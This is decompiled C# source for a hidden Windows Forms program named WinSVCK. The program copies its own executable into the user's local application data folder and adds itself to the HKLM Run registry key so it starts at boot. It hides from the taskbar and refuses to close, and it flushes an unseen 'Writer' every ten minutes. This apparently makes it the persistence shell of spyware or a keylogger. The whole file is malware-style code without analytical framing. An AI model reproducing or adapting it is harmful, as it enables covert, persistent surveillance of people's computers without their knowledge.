using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace WinSVCK;

[DesignerGenerated]
public class WinSVCK : Form
{
	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	private Writer Writer;

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	public WinSVCK()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(WinSVCK_FormClosing));
		((Form)this).add_Load((EventHandler)WinSVCK_Load);
		Writer = new Writer();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		components = new Container();
		Timer1 = new Timer(components);
		Button1 = new Button();
		((Control)this).SuspendLayout();
		Timer1.set_Enabled(true);
		Timer1.set_Interval(600000);
		Button button = Button1;
		Point location = new Point(82, 78);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(121, 67);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).set_Name("WinSVCK");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void WinSVCK_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
		((Control)this).set_Visible(false);
	}

	private void WinSVCK_Load(object sender, EventArgs e)
	{
		if (!CheckRegistry())
		{
			CopySVCK();
			RegistrySVCK();
			((Form)this).set_ShowInTaskbar(true);
			((Form)this).set_WindowState((FormWindowState)0);
		}
		Application.add_ApplicationExit((EventHandler)delegate
		{
			saveAll();
		});
	}

	private void CopySVCK()
	{
		string executablePath = Application.get_ExecutablePath();
		string destFileName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\WinSVCK.exe";
		if (File.Exists(executablePath))
		{
			File.Copy(executablePath, destFileName);
		}
	}

	private bool CheckRegistry()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: false);
		string text = Conversions.ToString(registryKey.GetValue("WinSVCK"));
		registryKey.Close();
		if (text == null)
		{
			return false;
		}
		return true;
	}

	private void RegistrySVCK()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("WinSVCK", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\WinSVCK.exe");
		registryKey.Close();
	}

	private void saveAll()
	{
		Writer.forceFlush(closing: true);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Writer.forceFlush(closing: false);
		((Control)this).set_Visible(false);
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"Button", (MsgBoxStyle)0, (object)null);
	}
}
